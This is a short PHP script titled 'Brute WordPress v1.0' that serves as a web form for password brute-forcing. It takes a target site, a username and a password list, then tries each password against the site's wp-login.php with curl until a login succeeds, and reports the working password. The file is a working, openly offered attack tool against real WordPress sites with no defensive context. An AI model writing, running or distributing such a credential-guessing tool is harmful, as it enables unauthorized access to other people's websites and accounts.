<?php


function login($url,$user,$pass){
       $login = $url."/wp-login.php";
       $to = $url."/wp-admin";
       $data = array('log'=>$user, 'pwd'=>$pass, 'rememberme'=>'forever','wp-submit'=>'Log In','redirect_to'=>$to,'testcookie'=>0);
       $ch = curl_init();
       curl_setopt($ch,CURLOPT_URL,$login);
       curl_setopt($ch,CURLOPT_POST,true);
       curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
       curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
       $resut1 = curl_exec($ch);
       curl_close($ch);
       if(eregi('<div id="login_error">',$resut1)){
            return false;
       }else{
             return true;
       }
       }

        if(!isset($_GET['start'])){
          echo '<title>Brute WordPress v1.0</title><br><br> <h1><center> Coded By Dr.5RaB</center></h1><center>
            <form method="POST" action="?start">
         TarGet   :<br>   <input name="target" type="text" value="http://www." size="50" /> <br />
         UserName :<br>   <input name="username" type="text" /><br />
         PassWord :<br>   <textarea clos"60" rows="6" name="passwords"></textarea> <br />
                          <input type="submit" value="Start">
            </form>';

 }else{
         $passwords = $_POST['passwords'];
		 $username = $_POST['username'];
	     $target = $_POST['target'];
		 $exp = explode("\n",$passwords);
		 
		 foreach($exp as $password){
		 if(login($target,$username,$password)){
		 echo "Password : $password";
		 echo "<script>alert('Done')</script>";
		 break;
		}
		 }
		 
 } 
 ?>